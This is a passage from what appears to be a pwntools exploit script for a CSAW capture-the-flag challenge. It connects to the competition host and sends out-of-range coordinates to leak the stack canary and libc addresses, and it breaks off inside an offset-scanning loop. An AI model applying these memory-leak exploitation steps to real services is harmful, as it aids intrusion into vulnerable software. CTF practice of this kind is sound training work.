    io.sendlineafter('shape> ', shape)
    io.sendlineafter('loc> ', f'{x} {y}')
    return io.recvuntil('shape> ', timeout=1)

def leak_canary_and_libc():
    io = remote('pwn.chal.csaw.io', 8000)

    # First try to leak canary using buffer overflow
    payload = b'+'  # shape
    leaked = place_shape(io, payload, 0xffff, 0)
    log.info(f"Initial leak: {leaked}")

    # Try multiple positions to find useful leaks
    for offset in range(-16, 16, 8):
